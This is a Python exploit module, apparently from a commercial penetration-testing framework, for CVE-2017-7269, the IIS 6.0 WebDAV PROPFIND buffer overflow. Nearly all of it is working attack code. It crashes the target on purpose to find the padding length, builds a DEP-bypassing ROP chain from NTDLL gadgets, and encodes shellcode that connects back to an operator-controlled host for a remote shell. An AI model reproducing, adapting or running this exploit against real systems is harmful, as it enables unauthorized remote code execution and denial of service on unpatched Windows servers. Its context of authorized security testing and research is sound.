#! /usr/bin/env python

import sys
import os
import time
import random
import string
if '.' not in sys.path:
    sys.path.append('.')

import libs.spkproxy as spkproxy

import canvasengine
import logging
from tcpexploit import tcpexploit
from exploitutils import *

import shellcode.shellcodeGenerator as shellcodeGenerator

from MOSDEF import mosdef
from encoder.chunkedaddencoder import intelchunkedaddencoder

NOTES = """
We do not require the operator to know the length of the disk path before hand. This module will
auto-discover it. In the process of doing so, a maximum of around 100 request will be sent. The server
will crash at most once if it is vulnerable.

If you already know a path or padding length, simply set those in their respective fields in the UI.
Their units are in bytes. If you know a path but not a path length, keep in mind that the paths must
be encoded in UTF-16.

We attempted to make this exploit work using our ISAPI socket-reusing shellcode. Unfortunately because
Client-Length must be set to 0 in order for the exploit to work, we cannot read in any more data from
the Canvas system. This is mentioned in the following Microsoft newsgroup post:

https://groups.google.com/forum/#!topic/microsoft.public.platformsdk.internet.server.isapi-dev/m-InvQrkQlM
"""

NAME                            = 'IIS 6.0 PROPFIND ScStoragePathFromUrl Stack Buffer Overflow'
VERSION                         = '1.0'
DESCRIPTION                     = NAME

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Microsoft"
DOCUMENTATION["CVE Name"]       = "CVE-2017-7269"
DOCUMENTATION['References']     = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269',
                                   "https://github.com/edwardz246003/IIS_exploit"]

DOCUMENTATION['Repeatability']  = 'Infinite'
DOCUMENTATION['Note']           = 'Malformed PROPFIND request cause remote shellcode execution'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Remote'
PROPERTY['ARCH']                = [ ['Windows'] ]
PROPERTY['VERSION']             = [ '2003' ]


def random_ascii(length):
    population = string.uppercase + string.lowercase + string.digits

    if length > len(population):
        population = population*(length / len(population) + 2)

    return "".join(random.sample(population, length))

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.host       = '127.0.0.1'
        self.port       = 80
        # for websend (inherits from tcpexploit)
        self.ssl        = False
        self.real_padding_length = None

    def neededListenerTypes(self):
        self.getargs()
        # return [canvasengine.HTTPMOSDEF, canvasengine.HTTPMOSDEF_SSL, canvasengine.UNIVERSAL_MOSDEF]
        if self.mosdef_type == "http":
            if self.ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        self.default_disk_path = "C:\\inetpub\\wwwroot"
        self.host       = self.target.interface
        self.port       = int(self.argsDict.get('port', self.port))
        self.ssl        = bool(int(self.argsDict.get('ssl', self.ssl)))
        self.user = self.argsDict.get("basicauth_password", "")
        self.password = self.argsDict.get("basicauth_user", "")
        self.ssl = self.argsDict.get("ssl", False)
        self.vhost = self.argsDict.get("vhost", self.host)

        proxy_string = self.argsDict.get("proxy_string", "")
        proxy_parts = proxy_string.split(":")

        self.proxy_port = None
        self.proxy_host = None

        if len(proxy_parts) != 1:
            self.proxy_host = proxy_parts[0].strip(" ")
            self.proxy_port = int(proxy_parts[1].strip(" "))

        self.disk_path_length = None
        if self.argsDict.get("disk_path_length","").isdigit():
            self.disk_path_length = int(self.argsDict.get("disk_path_length"))

        if self.argsDict.get("user_padding_length", "").isdigit():
            padding_length = int(self.argsDict.get("user_padding_length"))
            self.disk_path_length = self.padding_to_path_length(padding_length)

        self.discovered_padding_length = None

        self.auto_configure = True

        listener_type = self.argsDict.get("radiobutton2_value", "").lower()
        if "universal" in listener_type:
            self.mosdef_type = "universal"
        else:
            self.mosdef_type = "http"

        # The amount of time in seconds to wait before trying the exploit a server
        # that was crashed by disk-path-length discovery
        self.target_restart_wait = 10.0

        self.auth_type = None

    def padding_to_path_length(self, padding_length):
        #length until we start overwriting a pointer
        total_length = 222 + 2*len(self.default_disk_path)
        return total_length - padding_length

    def path_to_padding_length(self, path_length):
        total_length = 222 + 2*len(self.default_disk_path)
        return total_length - path_length

    def get_shellcode(self):
        raw_shellcode = None
        if self.mosdef_type == "http":
            import shellcode.standalone.windows.payloads as payloads
            p = payloads.payloads()
            sc = p.http_proxy(self.callback.ip, self.callback.port, SSL=self.ssl)
            raw_shellcode = p.assemble(sc)
        else:

            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",{"subespval": 0x8})

            # Your user may not be NT AUTHORITY \ NETWORK SERVICE if this
            # line is commented out, but one with a lower privilege
            sc.addAttr("revert_to_self_before_importing_ws2_32", {"win8_compatible":True})
            sc.addAttr("tcpconnect", {"port" : self.callback.port, "ipaddress" : self.callback.ip})
            mosdef_type = self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id = self.engine.getNewMosdefID(self)
            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
            sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
            sc.addAttr("ExitThread",None)
            raw_shellcode = sc.get()

        encoder = intelchunkedaddencoder()
        encoder.setbadstring("".join([chr(x) for x in range(0xd8, 0xe0)] + ["\x00"]))


        # We ended up clobbering pointers to our old stack frames due
        # to the fact that we had to maintain control of execution
        # after the ntdll!LdrpCheckNXCompatibility gadget, which loads
        # esp into ebp. However, we don't want to simply leave our stack
        # inside a writable memory range in NTDLL as critical data could
        # be overwritten. Thus we find the top of the stack in fs:[4],
        # subtract 4 from it (so that we have a writable stack pointer)
        # and subsequently use it.
        fixup_stub = ["xorl %ecx, %ecx",
                      "incl %ecx",
                      "incl %ecx",
                      "incl %ecx",
                      "incl %ecx",
                      "movl %fs:(%ecx), %esp",
                      "decl %esp",
                      "decl %esp",
                      "decl %esp",
                      "decl %esp"]

        return mosdef.assemble("\n".join(fixup_stub), "X86") + encoder.encode(raw_shellcode)

    def send_request(self, data, no_response=True):
        auth = None

        req_header = spkproxy.header()

        req_header.connectHost = self.target.interface
        req_header.connectPort = self.port

        req_header.URL = "/"
        req_header.verb = "PROPFIND"
        req_header.addHeader("Content-Length", "0")
        req_header.addHeader("Host", self.host)
        req_header.addHeader("If", data)
        req_header.setSurpressContentLength()

        req_body = spkproxy.body()

        ntlm_info = ["","",""] #NTLM user / password / domain
        proxy_info = ["", 0, "", 0]

        if self.auth_type == "basic":
            auth = spkproxy.BasicAuth(self.auth_user, self.auth_password)
            auth.getHeader(req_header)
        elif self.auth_type == "ntlm":
            ntlm_info = [self.auth_user, self.auth_password, self.auth_domain]

        if self.proxy_port is not None:
            proxy_info = [self.proxy_host, self.proxy_port, self.proxy_host, self.proxy_port]

        con = spkproxy.spkProxyConnection(None, None, proxy=proxy_info, ntlm=ntlm_info)

        con.gettcpsock = self.gettcpsock

        if self.ssl:
            con.clientisSSL = 1

        if no_response:
            con.sendRequest(req_header, req_body, noresponse=no_response)
        else:
            x = con.sendRequest(req_header, req_body, noresponse=no_response)
            return x

    def find_padding_length(self):
        # Binary search is an intractable strategy here. Once the server starts 500'ing, it doesn't
        # stop and there is no reliable way to restart it. Thus we can't find if we're under the crash
        # limit again. This means we end up using linear search.
        padding_length = 0

        # We get a 207 when this succeeds, 500 when we get a crash
        if_block="<http://%s/%%s> (Not <%s>) <http://%s/%%s>" % (self.host, random_ascii(6), self.host)

        response = self.send_request(if_block % ("B"*padding_length, "A"), no_response=False)

        if "207 Multi-Status" not in response:
            return None

        while "500 Internal Server Failure" not in response:
            response = self.send_request(if_block % ("B"*padding_length, "A"), no_response=False)
            padding_length += 1

        return (2*padding_length)-4 # remove >\x00\x00\x00

    def form_request(self, padding_length=222):
        shellcode = self.get_shellcode()

        if not shellcode:
            return None

        propfind = "PROPFIND / HTTP/1.1"
        host_header = "Host: %s" % self.vhost
        content_length = "Content-Length: 0"

        headers = "\r\n".join([propfind, host_header, content_length]) + "\r\n"

        if_block="If: <http://%s/" % self.host

        # httpext!CMethUtil::ScStoragePathFromUrl+0x5:
        # 67119456 8b4910          mov     ecx,dword ptr [ecx+10h]
        # 67119459 8b5508          mov     edx,dword ptr [ebp+8]
        # 6711945c 6a00            push    0
        # 6711945e ff7510          push    dword ptr [ebp+10h]
        # 67119461 ff750c          push    dword ptr [ebp+0Ch]
        # 67119464 e812d80000      call    httpext!ScStoragePathFromUrl (67126c7b)
        # 67119469 5d              pop     ebp
        # 6711946a c20c00          ret     0Ch


        # => make  ecx +0x10 =0x77ecb114+0d44
        # (format "ecx: %x" (- start-of-2nd-buffer #x10))
        # "ecx: 77ecb130"

        start = 0x7c88b010
        fake_cbstack_size = 0x30303030
        ifurl_copy_dst = start        # dest for copy of the path associated with this if-url-path
        vtable_minus_10 = ifurl_copy_dst + self.padding_to_path_length(padding_length) + 2  # 2 for the unicode '\'
        second_padding_length = (vtable_minus_10 %4)
        vtable_minus_10 += second_padding_length - 0x10

        vtable_self = vtable_minus_10+0x10
        shellcode_start = vtable_self+44
        shellcode_stack_ptr = shellcode_start-8

        # ensure that we are using safe-to-encode addresses
        for i in range(0,200):
            fake_cbstack_size = 0x30303030
            ifurl_copy_dst = start        # dest for copy of the path associated with this if-url-path
            vtable_minus_10 = ifurl_copy_dst + self.padding_to_path_length(padding_length) + 2 + second_padding_length # 2 for the utf-16 '\'
            vtable_minus_10 += (vtable_minus_10 %4) - 0x10

            vtable_self = vtable_minus_10+0x10
            shellcode_start = vtable_self+44
            shellcode_stack_ptr = shellcode_start-8

            addresses = [start, fake_cbstack_size, ifurl_copy_dst, vtable_minus_10,
                         vtable_self, shellcode_start, shellcode_stack_ptr]

            blob = "".join([struct.pack("<L", x) for x in addresses])
            safe = True
            for char in blob:
                if (ord(char) in range(0xd8, 0xe0)) or (ord(char) == 0):
                    start += 4
                    safe = False
                    break

            if safe:
                break



        if_block += "".join([random_ascii(padding_length),
                             struct.pack("<L", fake_cbstack_size),
                             struct.pack("<L", ifurl_copy_dst),
                             random_ascii(40),
                             struct.pack("<L", vtable_minus_10),
        ]).decode('utf-16').encode('utf-8') + '>'
        # .decode().encode() make a utf-8 string that will be converted
        # to a utf-16 (Windows internally uses that encoding) that has
        # a byte representation described in joined list above

        not_block = " (Not <%s>) <http://%s/" % (random_ascii(14), self.host)

        # Here's the point at which we gain control of execution.
        # The pointer to not_block input controls EDI.

        # 0:009> u
        # httpext!ScStripAndCheckHttpPrefix+0x13:
        # 671335e8 8b07            mov     eax,dword ptr [edi]
        # 671335ea 8d4dfc          lea     ecx,[ebp-4]
        # 671335ed 51              push    ecx
        # 671335ee 8bcf            mov     ecx,edi
        # 671335f0 8955f4          mov     dword ptr [ebp-0Ch],edx
        # 671335f3 ff5024          call    dword ptr [eax+24h]


        # NTDLL stack pivot gaget
        # starting disassembly at: 7c81a80e len:30
        # >>>>>>>>>>
        # 7c81a80e: mov esp, ecx (8b e1)
        # 7c81a810: mov ecx, dword ptr [eax] (8b 08)
        # 7c81a812: mov eax, dword ptr [eax + 4] (8b 40 04)
        # 7c81a815: push eax (50)
        # 7c81a816: ret  (c3)

        # 0x7c83f517 points inside of ntdll!LdrpCheckNXCompatibility
        # where the stack frame setup. We can't directly call this
        # function via rop as its parameters require many contiguous
        # NULL bytes.


        # Inside of NTDLL
        # 7c813b5a: add esp, 0x10 (83 c4 10)
        # 7c813b5d: pop ebp (5d)
        # 7c813b5e: ret (c3)


        """
        Our gadget chain works like this: 671335f3
        (call dword ptr [eax+24h]) runs, calling our stack pivot gadget
        at 7c81a80e. We then call 7c813b5a to set EBP to allow us to
        continue execution after our DEP disable gadget (0x7c83f517) as
        well as to avoid corrupting the rest of our data. Subsequently,
        we return into start+44, which points to the start of our
        shellcode.
        """

        not_block_data = "".join([random_ascii(second_padding_length),
                                  struct.pack("<L", vtable_self),
                                  struct.pack('<L', 0x7c813b5a), # second - add esp, 0x10 to...
                                  random_ascii(8),
                                  struct.pack("<L", shellcode_stack_ptr),
                                  struct.pack("<L", 0x7c83f517), # third - ... Disable DEP and win
                                  random_ascii(12),
                                  struct.pack("<L",0x7c81a80e), # first - stack pivot opcode
                                  struct.pack("<L", shellcode_start),
                                  shellcode])
        not_block_data += "A"*(len(not_block_data) % 2)
        enc_nbd = not_block_data.decode('utf-16').encode('utf-8')

        not_block += enc_nbd
        not_block += '>'


        logging.info("crafted malicious if block...")
        return if_block[4:] + not_block

    def test(self):
        self.getargs()
        auth = None

        req_header = spkproxy.header()

        req_header.connectHost = self.target.interface
        req_header.connectPort = self.port

        req_header.URL = "/"
        req_header.verb = "OPTIONS"
        req_header.addHeader("Host", self.host)

        req_body = spkproxy.body()

        ntlm_info = ["","",""] #NTLM user / password / domain
        proxy_info = ["", 0, "", 0]

        if self.auth_type == "basic":
            auth = spkproxy.BasicAuth(self.auth_user, self.auth_password)
            auth.getHeader(req_header)
        elif self.auth_type == "ntlm":
            ntlm_info = [self.auth_user, self.auth_password, self.auth_domain]

        if self.proxy_port is not None:
            proxy_info = [self.proxy_host, self.proxy_port, self.proxy_host, self.proxy_port]

        con = spkproxy.spkProxyConnection(None, None, proxy=proxy_info, ntlm=ntlm_info)

        con.gettcpsock = self.gettcpsock

        if self.ssl:
            con.clientisSSL = 1

        logging.info("sending header request")
        response = con.sendRequest(req_header, req_body, noresponse=False)

        if isinstance(response, str):
            return int("Server: Microsoft-IIS/6.0" in response and "MS-Author-Via: DAV" in response)
        else:
            return 0

    def run(self):
        self.getargs()

        if (self.disk_path_length is None) and self.auto_configure:
            logging.info("auto-discovering padding length...")
            padding_length = self.find_padding_length()

            if padding_length != None:
                self.discovered_padding_length = padding_length
                logging.info("module was able to successfully crash target")

            logging.info("discovered a padding length of:" + str(self.discovered_padding_length))

            self.real_padding_length = self.discovered_padding_length
            logging.info("waiting for server restart...")

            time.sleep(self.target_restart_wait)

            if_block="<http://%s/%%s> (Not <%s>) <http://%s/%%s>" % (self.host, random_ascii(7),
                                                                     self.host)
            response = self.send_request(if_block % ("B"*1, "A"), no_response=False)
            logging.info("sent request to ensure webserver restarted...")

            if "207 Multi-Status" not in response:
                logging.error("web server failed to restart! exiting...")
                return 0
        elif self.disk_path_length is not None:
            logging.info("setting padding length to user-supplied value:" + str(self.disk_path_length))
            self.real_padding_length = self.path_to_padding_length(self.disk_path_length)

        if not self.real_padding_length:
            logging.warning("unable to discover remote disk-path length; exiting...")
            return 0


        if_header = self.form_request(padding_length=self.real_padding_length)
        self.send_request(if_header, no_response=True)
        logging.info("sent evil request! waiting for callback...")
        return 1

if __name__ == '__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)

